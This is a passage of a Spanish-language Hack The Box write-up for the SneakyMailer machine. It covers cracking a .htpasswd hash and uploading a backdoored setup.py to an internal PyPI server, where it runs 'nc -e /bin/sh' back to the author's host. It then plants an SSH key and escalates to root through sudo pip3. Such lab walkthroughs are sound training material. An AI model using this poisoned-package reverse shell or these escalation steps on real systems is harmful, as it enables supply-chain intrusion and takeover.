+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre><span class="go">vmail:x:5000:5000::/home/vmail:/usr/sbin/nologin
+developer:x:1001:1001:,,,:/var/www/dev.sneakycorp.htb:/bin/bash
+pypi:x:998:998::/var/www/pypi.sneakycorp.htb:/usr/sbin/nologin
+low:x:1000:1000:,,,:/home/low:/bin/bash
+</span><span class="gp">developer@sneakymailer:/$</span><span class="w"> 
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Me llamo mucho la atención el usuario pypi con el dominio <code class="language-plaintext highlighter-rouge">pypi.sneakycorp.htb</code> normalmente el servidor pypi corre en el puerto <code class="language-plaintext highlighter-rouge">8080</code>, ahora sabemos qué servicio es.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="go">127.0.0.1       localhost
+127.0.1.1       kali
+10.10.10.197    sneakycorp.htb sneakymailer.htb pypi.sneakycorp.htb dev.sneakycorp.htb
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/htb/sneakymailer/pipy.png" alt="Desktop View" /></p>
+
+<hr />
+
+<p>Para seguir avanzando tire un linenum.sh para ver si encontraba algo, y efectivamente encontramos el hash del usuario pypi</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre><span class="go">htpasswd
+[-] htpasswd found - could contain passwords:                                                            
+/var/www/pypi.sneakycorp.htb/.htpasswd                                                                   
+</span><span class="gp">pypi:$</span>apr1<span class="nv">$RV5c5YVs$U9</span>.OTqF5n8K4mxWpSSR/p/
+</pre></td></tr></tbody></table></code></pre></div></div>
+<hr />
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td> --><td class="rouge-code"><pre><span class="gp">root@kali:/home/kali#</span><span class="w"> </span>john <span class="nb">hash</span> <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+<span class="go">Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+</span><span class="gp">Loaded 1 password hash (md5crypt, crypt(3) $</span>1<span class="nv">$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
+<span class="go">Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+soufianeelhaoui  (pypi)
+1g 0:00:00:20 DONE (2020-12-04 11:59) 0.04764g/s 170284p/s 170284c/s 170284C/s souheib2..souderton16
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>OK, tenemos la contraseña de el usuario <code class="language-plaintext highlighter-rouge">pypi:soufianeelhaoui</code>. Antes de continuar hagamos una pausa y recordemos lo que decía el segundo email que encontramos en imap</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre><span class="go">Hello low
+
+Your current task is to install, test and then erase every python module you 
+find in our PyPI service, let me know if you have any inconvenience.
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Básicamente lo que le está diciendo a low es que su tarea es probar y borrar cada módulo de python que encuentre en el servicio PyPi que está corriendo en el puerto 8080. 
+Y esto es bastante curioso, porque podríamos crear un paquete, subirlo y low deberá probarlo. Entonces lo que haremos es meter nuestro payload en ese paquete maligno, para conseguir la shell como low.</p>
+
+<p>Luego de leer un poco la documentación podemos ponernos manos a la obra. <a href="https://pypi.org/project/pypiserver/"><strong>pipyserver</strong></a></p>
+
+<p>Necesitaremos crear 2 archivos esenciales</p>
+
+<p><code class="language-plaintext highlighter-rouge">.pypirc</code>: Este archivo almacena inicios de sesión y contraseñas para autenticar sus cuentas. Normalmente se almacena en su directorio personal.</p>
+
+<p><code class="language-plaintext highlighter-rouge">setup.py</code>: Aquí ira nuestro código malicioso.</p>
+
+<p><img src="/htb/sneakymailer/pyprc.png" alt="Desktop View" /></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre><span class="go">[distutils]
+	index-servers = sneakycorp
+	[sneakycorp]
+	repository: http://pypi.sneakycorp.htb:8080
+	username: pypi
+	password: soufianeelhaoui
+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td> --><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span><span class="kn">import</span> <span class="nn">setuptools</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">comando</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'nc -e /bin/sh 10.10.14.63 4848'</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"README.md"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+    <span class="n">long_description</span> <span class="o">=</span> <span class="n">fh</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="n">setuptools</span><span class="p">.</span><span class="n">setup</span><span class="p">(</span>
+    <span class="n">name</span><span class="o">=</span><span class="s">"alto_backdoor"</span><span class="p">,</span> <span class="c1"># Replace with your own username
+</span>    <span class="n">version</span><span class="o">=</span><span class="s">"0.0.1"</span><span class="p">,</span>
+    <span class="n">author</span><span class="o">=</span><span class="s">"0xdeed"</span><span class="p">,</span>
+    <span class="n">author_email</span><span class="o">=</span><span class="s">"author@example.com"</span><span class="p">,</span>
+    <span class="n">description</span><span class="o">=</span><span class="s">"A small example package"</span><span class="p">,</span>
+    <span class="n">long_description</span><span class="o">=</span><span class="n">long_description</span><span class="p">,</span>
+    <span class="n">long_description_content_type</span><span class="o">=</span><span class="s">"text/markdown"</span><span class="p">,</span>
+    <span class="n">url</span><span class="o">=</span><span class="s">"https://github.com/pypa/sampleproject"</span><span class="p">,</span>
+    <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="p">.</span><span class="n">find_packages</span><span class="p">(),</span>
+    <span class="n">classifiers</span><span class="o">=</span><span class="p">[</span>
+        <span class="s">"Programming Language :: Python :: 3"</span><span class="p">,</span>
+        <span class="s">"License :: OSI Approved :: MIT License"</span><span class="p">,</span>
+        <span class="s">"Operating System :: OS Independent"</span><span class="p">,</span>
+    <span class="p">],</span>
+    <span class="n">python_requires</span><span class="o">=</span><span class="s">'&gt;=3.6'</span><span class="p">,</span>
+<span class="p">)</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Nos ponemos a la escucha en nuestra máquina:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre><span class="go">python3 -m http.server 4242
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Y Descargamos los archivos en la máquina de la víctima</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre><span class="go">wget 10.10.14.63:4242 -r
+
+</span><span class="gp">10.10.14.63:4242/.p 100%[===================&gt;</span><span class="o">]</span>     138  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      
+<span class="go">
+2020-12-04 12:15:15 (24.3 MB/s) - ‘10.10.14.63:4242/.pypirc’ saved [138/138]
+
+</span><span class="gp">10.10.14.63:4242/se 100%[===================&gt;</span><span class="o">]</span>     748  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.003s  
+<span class="go">
+2020-12-04 12:15:15 (251 KB/s) - ‘10.10.14.63:4242/setup.py’ saved [748/748]
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre><span class="gp">developer@sneakymailer:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">ls -la
+total 16
+drwxrwxrwx 2 developer developer 4096 Dec  4 12:15 .
+drwxrwxrwx 3 developer developer 4096 Dec  4 12:15 ..
+-rw-rw-rw- 1 developer developer  138 Dec  4 12:13 .pypirc
+-rw-rw-rw- 1 developer developer  748 Dec  4 12:13 setup.py
+</span><span class="gp">developer@sneakymailer:~$</span><span class="w"> 
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Tenemos los dos archivos, ahora podemos subirlos usando el siguiente comando: <code class="language-plaintext highlighter-rouge">python3 setup.py sdist upload -r sneakycorp</code></p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre><span class="gp">kali@kali:~/Documents/hackthebox/sneakymailer/paquete$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 4848
+<span class="go">listening on [any] 4848 ...
+connect to [10.10.14.63] from (UNKNOWN) [10.10.10.197] 35494
+whoami
+developer
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Obtenemos el reverse shell pero aun somos developer, porque se esta ejecutando 2 veces primero como developer y luego low lo ejecuta, como solo queremos que low sea el que lo ejecute hagamos un pequeño truco, sabemos que el uid del usuario low es 1000, entonces el comando solo se ejecutara si el uid corresponde con el de low.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td> --><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span><span class="kn">import</span> <span class="nn">setuptools</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">1000</span><span class="p">:</span>
+	<span class="n">comando</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'nc -e /bin/sh 10.10.14.63 4848'</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"README.md"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
+    <span class="n">long_description</span> <span class="o">=</span> <span class="n">fh</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="n">setuptools</span><span class="p">.</span><span class="n">setup</span><span class="p">(</span>
+    <span class="n">name</span><span class="o">=</span><span class="s">"alto_backdoor"</span><span class="p">,</span> <span class="c1"># Replace with your own username
+</span>    <span class="n">version</span><span class="o">=</span><span class="s">"0.0.1"</span><span class="p">,</span>
+    <span class="n">author</span><span class="o">=</span><span class="s">"0xdeed"</span><span class="p">,</span>
+    <span class="n">author_email</span><span class="o">=</span><span class="s">"author@example.com"</span><span class="p">,</span>
+    <span class="n">description</span><span class="o">=</span><span class="s">"A small example package"</span><span class="p">,</span>
+    <span class="n">long_description</span><span class="o">=</span><span class="n">long_description</span><span class="p">,</span>
+    <span class="n">long_description_content_type</span><span class="o">=</span><span class="s">"text/markdown"</span><span class="p">,</span>
+    <span class="n">url</span><span class="o">=</span><span class="s">"https://github.com/pypa/sampleproject"</span><span class="p">,</span>
+    <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="p">.</span><span class="n">find_packages</span><span class="p">(),</span>
+    <span class="n">classifiers</span><span class="o">=</span><span class="p">[</span>
+        <span class="s">"Programming Language :: Python :: 3"</span><span class="p">,</span>
+        <span class="s">"License :: OSI Approved :: MIT License"</span><span class="p">,</span>
+        <span class="s">"Operating System :: OS Independent"</span><span class="p">,</span>
+    <span class="p">],</span>
+    <span class="n">python_requires</span><span class="o">=</span><span class="s">'&gt;=3.6'</span><span class="p">,</span>
+<span class="p">)</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>subimos con el siguiente comando:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre><span class="go">python3 setup.py sdist register -r sneakycorp upload -r sneakycorp
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Nos ponemos a la escucha y obtenemos el shell como low.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre><span class="gp">kali@kali:~$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 4848
+<span class="go">listening on [any] 4848 ...
+connect to [10.10.14.63] from (UNKNOWN) [10.10.10.197] 37728
+whoami
+low
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Para trabajar de manera más cómoda lo que hice fue usar el authorized_key para poder logearme sin password usando mi llave publica de ssh</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre><span class="gp">low@sneakymailer:~/.ssh$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpgc1wqbZzNPSqfx/IePt0CU0e3yDPt5OAKTkAMmpGCy8BH/pRa1RqGPHm6uI2j0i7mEwnKElcqQRllUwDltLY17mmJp+GdxAqJq8QJpCHY+1fujuONJgok5DR8pCrJW4RbydM0Xvn3c8wmduxN/cbfXuHjCT8bc+UzzQ3yaFdBnkLmuZIYbVtWZ3T9UPQlBSHow4lGpm+2ahxmXBhgNTOg8udPzH+eJxSx2dShdLGbf1VJjVX92sqt0MuT7wmSBqdTFk8B4Isc0XamT1SCu50OGTUT0dMfXKyGuQ2rcXozCKvaLBfclvp09edGw28iJIfQHbrh89IdQALvZZc1nTuOvFm3HXAPJJQ+lghYrzbvWIXgypSwLC4Gr57O4cBXcTembHcTQYPqa5UYK/2EKep/u/oYgJUhntspI+jyG7n0ioNKduDSFDu1OdVHS0rOh7TpywMU7eyCHZ1iDNPZ7+c7TZd8Ooh9mrYdRwaOEUYw2bNm2Rb0RGtNa6LgTR0dLU= kali@kali"</span> <span class="o">&gt;</span> authorized_keys
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<asciinema-player src="/htb/sneakymailer/user.cast" cols="107" rows="24"></asciinema-player>
+<hr />
+
+<h2 id="roottxt">root.txt</h2>
+
+<p>Lo primero que hice fue tirar un <code class="language-plaintext highlighter-rouge">sudo -l</code></p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre><span class="gp">low@sneakymailer:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
+Matching Defaults entries for low on sneakymailer:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User low may run the following commands on sneakymailer:
+    (root) NOPASSWD: /usr/bin/pip3
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="gtfobins-pip3">GTFObins pip3</h3>
+<p>Y para mi sorpresa podemos ejecutar pip3 como root. Busque en los gtfobins a ver si podemos bypassear el pip3 para obtener la shell y efectivamente podemos <a href="https://gtfobins.github.io/gtfobins/pip/"><strong>pip3 gtfobins</strong></a></p>
+
+<p>Lo que vamos a hacer es muy sencillo solo seguiremos los pasos, en la maquina de sneakymailer vamos a ejecutar lo siguiente:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="gp">TF=$</span><span class="o">(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="o">)</span>
+<span class="gp">echo "import os;</span><span class="w"> </span>os.execl<span class="o">(</span><span class="s1">'/bin/sh'</span>, <span class="s1">'sh'</span>, <span class="s1">'-c'</span>, <span class="s1">'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)'</span><span class="o">)</span><span class="s2">" &gt; </span><span class="nv">$TF</span><span class="s2">/setup.py
+</span><span class="gp">sudo pip3 install $</span><span class="s2">TF 
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<asciinema-player src="/htb/sneakymailer/root.cast" cols="107" rows="24"></asciinema-player>
+<hr />
+
+<p><img src="/htb/sneakymailer/sneaky.gif" alt="Desktop View" /></p>
+
+<hr />
+
+<h2 id="recursos">Recursos</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Topics</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><a href="https://k9mail.app/documentation/development/imapExtensions.html"><strong>Comandos IMAP</strong></a></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="https://pypi.org/project/pypiserver/"><strong>PyPi Server</strong></a></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="https://gtfobins.github.io/gtfobins/pip/"><strong>GTFOBINS pip3</strong></a></td>
+    </tr>
+  </tbody>
+</table>
+:ET
